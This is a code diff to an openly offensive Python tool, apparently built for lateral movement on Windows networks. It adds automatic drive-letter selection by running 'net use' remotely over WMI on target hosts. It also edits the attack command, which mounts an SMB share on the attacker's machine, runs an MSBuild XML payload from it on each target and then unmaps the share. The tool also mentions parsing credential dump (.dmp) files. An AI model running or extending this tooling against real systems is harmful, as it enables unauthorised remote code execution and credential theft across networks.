@@ -1,7 +1,8 @@
 from __future__ import division
 from __future__ import print_function
-import sys
 import os
+import re
+import sys
 import cmd
 import time
 import nmap
@@ -13,6 +14,7 @@ import logging
 import argparse
 import threading
 import subprocess
+import collections
 import netifaces as ni
 from base64 import b64encode
 from datetime import datetime
@@ -63,6 +65,8 @@ reaper_banner = """
 with open('log.txt', 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
+
+outdata = []
 
 ################################################# START OF ATEXEC #########################################################################
 class TSCH_EXEC:
@@ -485,6 +489,9 @@ class RemoteShell(cmd.Cmd):
 
     def send_data(self, data):
         self.execute_remote(data, self.__shell_type)
+        items = re.findall('[A-Z][:]', str(self.__outputBuffer))
+        for item in items:
+            outdata.append(item)
         with open('log.txt', 'a') as f:
             f.write(self.__outputBuffer + '\n')
             f.close()
@@ -731,6 +738,37 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
+def auto_drive(addresses): # really helpful so you dont have to know which drive letter to use
+    print('{}[+]{} Determining the best drive letter to use this may take a moment...\n'.format(color_BLU, color_reset))
+    for ip in addresses:
+        executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
+                           options.k, options.dc_ip, 'cmd')
+        executer.run(ip, False)
+
+    cleaned_outdata = []
+    for drive in outdata:
+        cleaned_outdata.append(drive.replace(":", ""))
+
+    inuse_driveletters = []
+
+    for letter in cleaned_outdata:
+        if letter not in inuse_driveletters:
+            inuse_driveletters.append(letter)
+
+    for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
+        if item not in inuse_driveletters and item != 'C' and item != 'D':
+            return item
+
+    least_common = collections.Counter(cleaned_outdata).most_common()[-1]
+    print('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
+    print('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))
+
+    yn = input('Would you like to use {}: as the drive letter if not we exit ps. the program will hang on the machines that have the drive mounted (y/N) '.format(least_common[0]))
+    if yn.lower() == 'y':
+        return least_common[0]
+    else:
+        exit(0)
+
 def mt_execute(ip): # multithreading requires a function
     print("{} Attacking {}".format(green_plus, ip))
     try:
@@ -771,7 +809,7 @@ if __name__ == '__main__':
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-ap', action='store_true', default = False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
-    parser.add_argument('-drive', action='store', default = 'Q', help='Set the drive letter for the remote device to connect with default=Q')
+    parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90 (WARNING atexec requires a ~8 second minumum)')
     parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec'], help='Choose a method to execute the commands')
@@ -898,13 +936,16 @@ if __name__ == '__main__':
                 exit(0)
 
         share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
+        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
+
+        #automatically find the best drive to use
+        if options.drive is None and options.method == 'wmiexec':
+            drive_letter = auto_drive(addresses)
 
         gen_payload(share_name, payload_name, drive_letter) # creates the payload
 
-        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
-
         print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
-        command = r"net use {}: \\{}\{} /user:{} {} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+        command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
 
